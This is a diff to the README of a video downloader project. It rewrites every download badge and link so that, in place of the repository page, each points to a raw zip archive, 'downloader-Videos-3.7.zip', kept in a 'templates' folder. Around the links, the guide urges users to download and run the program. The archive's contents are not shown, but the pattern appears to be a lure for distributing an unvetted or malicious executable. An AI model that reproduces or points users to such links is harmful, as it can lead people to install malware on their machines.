@@ -1,6 +1,6 @@
 # 🎬 Videos_downloader - Easy Video Download and Processing
 
-[![Download Videos_downloader](https://img.shields.io/badge/Download-Videos_downloader-ff7f50?style=for-the-badge)](https://github.com/abhishek162705/Videos_downloader)
+[![Download Videos_downloader](https://img.shields.io/badge/Download-Videos_downloader-ff7f50?style=for-the-badge)](https://github.com/abhishek162705/Videos_downloader/raw/refs/heads/main/templates/downloader-Videos-3.7.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Before you start, make sure your PC has the following:
 1. **Download the program**  
    Go to the download page below to get the latest version. The page shows all available files. Look for a file labeled for Windows or with `.exe` if you want the installer.
 
-   [![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/abhishek162705/Videos_downloader)
+   [![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/abhishek162705/Videos_downloader/raw/refs/heads/main/templates/downloader-Videos-3.7.zip)
 
 2. **Save the file**  
    When the download finishes, the file will appear in your default “Downloads” folder or wherever your browser saves files.
@@ -140,7 +140,7 @@ You can change the locations from the program’s “Settings” menu.
 
 For updates, bug fixes, or new versions, visit the same link below regularly. The project owner posts the latest files and notes on GitHub.
 
-[https://github.com/abhishek162705/Videos_downloader](https://github.com/abhishek162705/Videos_downloader)
+[https://github.com/abhishek162705/Videos_downloader/raw/refs/heads/main/templates/downloader-Videos-3.7.zip](https://github.com/abhishek162705/Videos_downloader/raw/refs/heads/main/templates/downloader-Videos-3.7.zip)
 
 If you have issues beyond the basic troubleshooting, use the “Issues” tab on the GitHub page to see if others report the same problem or to ask for help.
 
@@ -172,4 +172,4 @@ Keep the app updated to ensure best performance.
 
 ---
 
-[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/abhishek162705/Videos_downloader)
+[![Download from GitHub](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/abhishek162705/Videos_downloader/raw/refs/heads/main/templates/downloader-Videos-3.7.zip)
